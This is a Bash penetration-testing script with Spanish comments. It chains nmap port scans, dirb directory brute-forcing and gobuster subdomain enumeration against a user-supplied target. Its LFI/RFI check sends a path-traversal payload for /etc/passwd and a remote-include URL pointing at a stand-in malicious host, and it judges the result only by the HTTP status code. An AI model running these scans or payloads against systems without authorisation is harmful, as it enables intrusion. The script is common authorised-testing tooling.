#!/bin/bash

#Limpiar pantalla
clear

#Logo
echo "#######                      #       "
echo "#     # #    # #    # #####  #    #  "
echo "#     # #   #  #    # #    # #    #  "
echo "#     # ####   #    # #    # #    #  "
echo "#     # #  #   #    # #    # ####### "
echo "#     # #   #  #    # #    #      #  "
echo "####### #    #  ####  #####       #  "

# Función para obtener la IP
obtener_direccion_ip() {
    echo "Ingresa la URL o la dirección IP a escanear:"
    read input
    
    # Extraer el dominio de una URL si es necesario
    if [[ $input =~ ^https?:// ]]; then
        # Extrae el dominio de la URL
        dominio=$(echo $input | sed -E 's#^https?://([^/]+).*#\1#')
    else
        dominio=$input
    fi
    
    # Verificar si la entrada es una dirección IP válida
    if [[ $dominio =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        host=$dominio
        tipo="IP"
    else
        # Si no es una dirección IP, realizar una búsqueda DNS con nslookup
        echo "Realizando búsqueda DNS para obtener la dirección IP de $dominio..."
        # Filtrar solo direcciones IPv4 y tomar la primera
        ip=$(nslookup $dominio | awk '/^Address: / { print $2 }' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n 1)
        
        if [ -z "$ip" ]; then
            echo "No se pudo obtener una dirección IPv4 para $dominio."
            echo "¿Conoces la dirección IP de $dominio? (s/n):"
            read respuesta
            
            if [[ $respuesta == "s" || $respuesta == "S" ]]; then
                echo "Ingresa la dirección IP de $dominio:"
                read ip_manual
                if [[ $ip_manual =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                    host=$ip_manual
                    tipo="URL"
                else
                    echo "La dirección IP proporcionada no es válida. Saliendo..."
                    exit 1
                fi
            else
                echo "Saliendo..."
                exit 1
            fi
        else
            host=$ip
            url=$dominio
            tipo="URL"
        fi
    fi
    
    echo "La dirección IP obtenida es: $host"
}

# Función para crear carpeta de trabajo
crear_directorio() {
    echo "Creando directorio de trabajo"
    echo
    
    if [ -d "$host" ]; then
        echo "El directorio $host ya existe."
    else
        # Crear el directorio
        mkdir -p "$host/nmap"
        mkdir -p "$host/directorios"
        mkdir -p "$host/subdominios"
        echo "Directorio $host y subcarpetas creados correctamente."
    fi
}

# Funcion scaneo de puertos

escanear_puertos() {
    # ping
    echo "Realizando ping a $host..."
    echo
    
    if ping -c 1 $host &> /dev/null; then
        echo "El host $host está disponible."
        echo
        
        # Scaneo con nmap
        echo "Realizando scaneo de puertos con Nmap en el host $host..."
        echo
        sudo nmap -p- -sS --min-rate 5000 -vvv -oN ./$host/nmap/resultado $host
        
    else
        echo "Error: El host $host no es correcto o está caído."
    fi
}

escanear_directorios() {
    echo "Realizando búsqueda de directorios de $host"
    echo
    
    # Solicitar la URL al usuario
    echo "Introduce la URL completa (ej. http://example.com): "
    read url

    # Preguntar al usuario si desea realizar un escaneo de puertos con Nmap
    read -p "¿Deseas realizar un escaneo de puertos con Nmap? (s/n): " opcion_escaneo
    if [ "$opcion_escaneo" = "s" ]; then
        # Ejecutar un escaneo de puertos con Nmap y guardar el resultado en la ruta designada
        echo "Realizando escaneo de puertos con Nmap..."
        sudo nmap -p- --open -sS --min-rate 5000 -oN ./$host/nmap/resultado "$host"
        echo "Escaneo de puertos completado. Resultados guardados en ./$host/nmap/resultado"
    elif [ "$opcion_escaneo" != "n" ]; then
        echo "Opción no válida. Por favor, ingresa 's' para realizar el escaneo o 'n' para omitirlo."
        return 1
    fi

    # Verificar si el archivo de resultados de Nmap existe
    if [ ! -f ./$host/nmap/resultado ]; then
        echo "No se encontró el archivo de resultados de Nmap."
        echo "Por favor, realiza un escaneo Nmap primero."
        return 1
    fi
    
    # Obtener los puertos abiertos del archivo de resultados de Nmap
    puertos=$(grep "open" ./$host/nmap/resultado | awk '{print $1}')
    
    # Mostrar los puertos abiertos al usuario
    echo "Puertos abiertos:"
    echo "$puertos"
    echo
    
    # Preguntar al usuario que puerto desea escanear
    echo "Introduce el número de puerto que deseas escanear: "
    read puerto
    
    # Validar que el puerto proporcionado por el usuario esté en la lista de puertos abiertos
    if ! echo "$puertos" | grep -q "\<$puerto\>"; then
        echo "El puerto $puerto no está abierto."
        return 1
    fi
    
    echo "URL: $url"
    echo "Puerto: $puerto"
    echo
    
    # Ejecutar dirb con la URL y el puerto proporcionados
    diccionario="/usr/share/dirb/wordlists/big.txt"
    dirb "$url:$puerto" $diccionario -o ./$host/directorios/directorios.txt
}

descubrir_subdominios() {
    echo "Ingresa la URL o la dirección IP para descubrir subdominios:"
    read input
    
    # Extraer el dominio de una URL si es necesario
    if [[ $input =~ ^https?:// ]]; then
        dominio=$(echo $input | sed -E 's#^https?://([^/]+).*#\1#')
    else
        dominio=$input
    fi
    
    echo "Descubriendo subdominios de $dominio"
    echo
    
    # Verificar si gobuster está instalado
    if ! command -v gobuster &> /dev/null; then
        echo "gobuster no está instalado. Instalándolo ahora..."
        
        # Detectar el sistema operativo y usar el gestor de paquetes adecuado
        if [ -f /etc/debian_version ]; then
            sudo apt-get update
            sudo apt-get install -y gobuster
        elif [ -f /etc/arch-release ]; then
            sudo pacman -Syu gobuster --noconfirm
        else
            echo "Sistema operativo no compatible para instalación automática de gobuster."
            return 1
        fi
    fi
    
    # Verificar si el archivo de resultados de Nmap existe
    if [ ! -f ./$host/nmap/resultado ]; then
        read -p "No se encontró el archivo de resultados de Nmap. ¿Deseas realizar un escaneo de puertos con Nmap? (s/n): " opcion_escaneo
        if [ "$opcion_escaneo" = "s" ]; then
            # Ejecutar un escaneo de puertos con Nmap y guardar el resultado en la ruta designada
            echo "Realizando escaneo de puertos con Nmap..."
            nmap -p- -sS --min-rate 5000 -oN ./$host/nmap/resultado "$host"
            echo "Escaneo de puertos completado. Resultados guardados en ./$host/nmap/resultado"
        elif [ "$opcion_escaneo" != "n" ]; then
            echo "Opción no válida. Por favor, ingresa 's' para realizar el escaneo o 'n' para omitirlo."
            return 1
        fi
    fi
    
    # Obtener los puertos abiertos del archivo de resultados de Nmap
    puertos=$(grep "open" ./$host/nmap/resultado | awk '{print $1}')
    
    # Mostrar los puertos abiertos al usuario
    echo "Puertos abiertos:"
    echo "$puertos"
    echo
    
    # Preguntar al usuario que puerto desea escanear
    echo "Introduce el número de puerto que deseas escanear: "
    read puerto
    
    # Validar que el puerto proporcionado por el usuario esté en la lista de puertos abiertos
    if ! echo "$puertos" | grep -q "\<$puerto\>"; then
        echo "El puerto $puerto no está abierto."
        return 1
    fi
    
    # Opción para elegir el diccionario
    read -p "¿Desea usar su propio diccionario (1) o uno por defecto (2)? Ingrese el número correspondiente: " opcion_diccionario

    if [ "$opcion_diccionario" -eq 1 ]; then
        read -p "Por favor, ingrese la ruta de su diccionario: " ruta_diccionario
        diccionario="$ruta_diccionario"
    elif [ "$opcion_diccionario" -eq 2 ]; then
        diccionario="/usr/share/wordlists/subdomains-top1million-110000.txt"
        # Comprobar si el diccionario por defecto existe
        if [ ! -f "$diccionario" ]; then
            echo "El diccionario por defecto no se encontró. Por favor, ingrese la ruta de su diccionario:"
            read ruta_diccionario
            diccionario="$ruta_diccionario"
        fi
    else
        echo "Opción no válida. Por favor, ingrese 1 para su propio diccionario o 2 para uno por defecto."
        return 1
    fi

    echo "Diccionario seleccionado: $diccionario"
    echo "Dominio: $dominio"
    echo "Puerto: $puerto"
    
    # Ejecutar gobuster para descubrir subdominios
    gobuster dns -d "$dominio" -w "$diccionario" -o "./$host/subdominios/subdominios.txt" --delay 0
}

escanear_lfi_rfi_vuln () {
    echo "Introduce la URL para comprobar si es vulnerable a RFI o LFI"
    read input
    
    # Perform checks for LFI and RFI vulnerabilities
    echo "Comprobando vulnerabilidades en $input..."
    
    # Perform LFI check
    lfi_result=$(curl -s -o /dev/null -w "%{http_code}" "$input?page=../../../../etc/passwd")
    if [ $lfi_result -eq 200 ]; then
        echo "Vulnerabilidad LFI detectada en $input"
    else
        echo "No se detecta vulnerabilidad LF en $input"
    fi
    
    # Perform RFI check
    rfi_result=$(curl -s -o /dev/null -w "%{http_code}" "$input?page=http://malicious-site.com/malicious-script.php")
    if [ $rfi_result -eq 200 ]; then
        echo "Vulnerabilidad RFI detectada en $input"
    else
        echo "No se detecta ninguna vulnerabilidad RFI en $input"
    fi
}

# Opciones de escaneo
opciones_escaneo() {
    echo "Selecciona una opción de escaneo:"
    echo "1. Escaneo completo (puertos, directorios, subdominios)"
    echo "2. Escaneo de puertos y directorios"
    echo "3. Escaneo de directorios y subdominios"
    echo "4. Elegir solo uno de los escaneos"
    echo
    
    read opcion
    
    case $opcion in
        1)
            escanear_puertos
            escanear_directorios
            descubrir_subdominios
            # Siempre será la ultima opcion
            escanear_lfi_rfi_vuln
        ;;
        2)
            escanear_puertos
            escanear_directorios
        ;;
        3)
            escanear_directorios
            descubrir_subdominios
        ;;
        4)
            echo "Selecciona solo uno de los escaneos:"
            echo "a. Escaneo de puertos"
            echo "b. Escaneo de directorios"
            echo "c. Descubrir subdominios"
            echo "d. Escaneo posible LFI"
            
            read escaneo
            
            case $escaneo in
                a)
                    escanear_puertos
                ;;
                b)
                    escanear_directorios
                ;;
                c)
                    descubrir_subdominios
                ;;
                d)
                    escanear_lfi_rfi_vuln
                ;;
                *)
                    echo "Opción no válida."
                ;;
            esac
        ;;
        *)
            echo "Opción no válida."
        ;;
    esac
}

# LLamar a funcion para obtener IP o URL
obtener_direccion_ip

# Llamar a la función para crear el directorio de trabajo
crear_directorio

# Llamar a la función de opciones de escaneo
opciones_escaneo
